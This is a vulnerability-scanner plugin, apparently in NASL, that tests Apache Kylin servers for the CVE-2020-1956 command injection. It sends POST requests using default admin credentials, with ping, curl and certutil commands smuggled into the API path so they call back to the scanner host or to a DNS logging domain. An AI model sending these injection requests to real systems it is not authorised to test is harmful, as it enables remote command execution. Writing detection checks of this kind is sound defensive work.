include("compat.inc");


if (description)
{
  script_id(51799246);
  script_version("1.3");
  script_cve_id("CVE-2020-1956");
  script_name(english:"Apache Kylin command injection vulnerability(CVE-2020-1956)");
  script_summary(english:"Apache Kylin command injection vulnerability(CVE-2020-1956)");
  script_set_attribute(attribute:"description", value:"Apache Kylin 2.3.0, and releases up to 2.6.5 and 3.0.1 has some restful apis which will concatenate os command with the user input string, a user is likely to be able to execute any os command without any protection or validation.");
  script_set_attribute(attribute:"solution", value:"At present, the manufacturer has released an upgrade patch to fix the vulnerability, and the patch acquisition link:https://lists.apache.org/thread.html/r1332ef34cf8e2c0589cf44ad269fb1fb4c06addec6297f0320f5111d%40%3Cuser.kylin.apache.org%3E");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();
  script_family(english:"Web Servers");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80, 7070);
  exit(0);
}



include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");
include("install_func.inc");
include("dump.inc");

############################################
function check_local_ping(port,os){
	ping_c = '';
	laddress = compat::this_host();
	pattern = hexstr(rand_str(length:8));
	if("windows" >< tolower(os))
	{
		ping_c = "ping%20-n%208%20"+ laddress;
	}
	else{
		ping_c = "ping%20-c%208%20-p%20"+ pattern + "%20" + laddress;
	}
	uri = "/kylin/api/cubes/kylin_sales_cube/aaa%26"+ping_c+"%26/migrate";
	var postdata = "project=aaas";
	var ping_request =
		'POST ' + uri +' HTTP/1.1\r\n' +
		'Host: ' + get_host_ip()+':'+ port+ '\r\n' +
		'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' + '\r\n' +
		'Content_type: application/x-www-form-urlencoded' + '\r\n' +
		'Authorization: Basic QURNSU46S1lMSU4='+ '\r\n' +
		'Connection: close'+ '\r\n' +
		'Accept: */*' + '\r\n' + 
		'\r\n' +
		postdata;

	soc = open_sock_tcp(port);
	if (!soc)
	{
	  audit(AUDIT_SOCK_FAIL, port, appname);
	}
	filter = "icmp and icmp[0] = 8 and src host " + get_host_ip();
	response = send_capture(socket:soc, data:ping_request, pcap_filter:filter);
	sleep(1);
	icmp = tolower(hexstr(get_icmp_element(icmp:response, element:"data")));
	close(soc);

	if("windows" >< tolower(os) && !isnull(icmp)){
		return {'vuln':true, 'report':ping_request};
	}
	if (pattern >< icmp && !isnull(icmp)){
		return {'vuln':true, 'report':ping_request};
	}

}

#################
function check_local_curl(port,os){
	pattern = hexstr(rand_str(length:8));
	var bind_result = bind_sock_tcp();
	curl_c = '';
	if (isnull(bind_result))audit(AUDIT_SOCK_FAIL, port);

	var bind_sock = bind_result[0];
	var bind_port = bind_result[1];
	if("windows" >< tolower(os))
	{
		curl_c = "certutil%20-urlcache%20-split%20-f%20"+ compat::this_host() + ':' + bind_port + '/Oligei' + pattern;;
	}
	else{
		curl_c = 'curl%20' + compat::this_host() + ':' + bind_port + '%24%7bPATH:0:1%7dOligei' + pattern;
	}
	uri = "/kylin/api/cubes/kylin_sales_cube/aaa%26"+curl_c+"%26/migrate";
	post_data = "project=aaas";
	if (get_kb_list("SSL/Transport/"+port)){
		kylin_send = http_send_recv3(method: "POST", port: port, item: uri,content_type:'application/x-www-form-urlencoded',add_headers: make_array("Authorization","Basic QURNSU46S1lMSU4="),data:post_data,fetch404: TRUE);
		reqs = http_last_sent_request();
		ssl_reqs = https_req_get(request:reqs, port:port);
		if (empty_or_null(ssl_reqs)) exit(0);
		var accept_socks = sock_accept(socket:bind_sock, timeout:10);
		var curl_responses = recv(socket:accept_socks, length:1024);
		if ('Oligei' + pattern >< curl_responses){
			return {'vuln':true, 'report':reqs};
		}

	}
	else{
		kylin_send = http_send_recv3(method: "POST", port: port, item: uri,content_type:'application/x-www-form-urlencoded',add_headers: make_array("Authorization","Basic QURNSU46S1lMSU4="),data:post_data,fetch404: TRUE);
		if (empty_or_null(kylin_send)) exit(0);
		var accept_sock = sock_accept(socket:bind_sock, timeout:10);
		var curl_response = recv(socket:accept_sock, length:1024);
		if ('Oligei' + pattern >< curl_response){
			return {'vuln':true, 'report':http_last_sent_request()};
		}
	}
}


#######################
function check_remote_ping(port,os){
	ping_c = '';
	pattern = hexstr(rand_str(length:8));
	laddress = pattern+".scanner.webpulse.cn";
	if("windows" >< tolower(os))
	{
		ping_c = "ping%20-n%208%20"+ laddress;
	}
	else{
		ping_c = "ping%20-c%208%20"+ laddress;
	}
	uri = "/kylin/api/cubes/kylin_sales_cube/aaa%26"+ping_c+"%26/migrate";
	var postdata = "project=aaas";
	if (get_kb_list("SSL/Transport/"+port)){
		kylin_send = http_send_recv3(method: "POST", port: port, item: uri,content_type:'application/x-www-form-urlencoded',add_headers: make_array("Authorization","Basic QURNSU46S1lMSU4="),data:postdata,fetch404: TRUE);
		reqs = http_last_sent_request();
		ssl_reqs = https_req_get(request:reqs, port:port);
		if (empty_or_null(ssl_reqs)) exit(0);
		if ('200 OK' >< ssl_reqs){
			report = "[DNSLOG_TOBE_VERIFY]:https://admin.webpulse.cn:1796/api/dns/scanner/"+pattern+"/[DNSLOG_TOBE_VERIFY]";
			report = report+'\n'+reqs;
			return {'vuln':true, 'report':report};
		}

	}
	else{
		kylin_send = http_send_recv3(method: "POST", port: port, item: uri,content_type:'application/x-www-form-urlencoded',add_headers: make_array("Authorization","Basic QURNSU46S1lMSU4="),data:postdata,fetch404: TRUE);
		if (empty_or_null(kylin_send)) exit(0);
		if ('200 O' >< kylin_send[0]){
			report = "[DNSLOG_TOBE_VERIFY]:https://admin.webpulse.cn:1796/api/dns/scanner/"+pattern+"/[DNSLOG_TOBE_VERIFY]";
			report = report+'\n'+http_last_sent_request();
			return {'vuln':true, 'report':report};
		}
	}
}

####################
#begin here
####################
os = get_kb_item_or_exit("Host/OS");
port = get_kb_item("Services/www");

result_l = check_local_ping(port:port,os:os);
if (result_l['vuln']){
	security_hole(port:port, extra:result_l['report']);
	exit(0);
}
result_c = check_local_curl(port:port,os:os);
if (result_c['vuln']){
	security_hole(port:port, extra:result_c['report']);
	exit(0);
}
result_r = check_remote_ping(port:port,os:os);
if (result_r['vuln']){
	security_hole(port:port, extra:result_r['report']);
	exit(0);
}
exit(0);
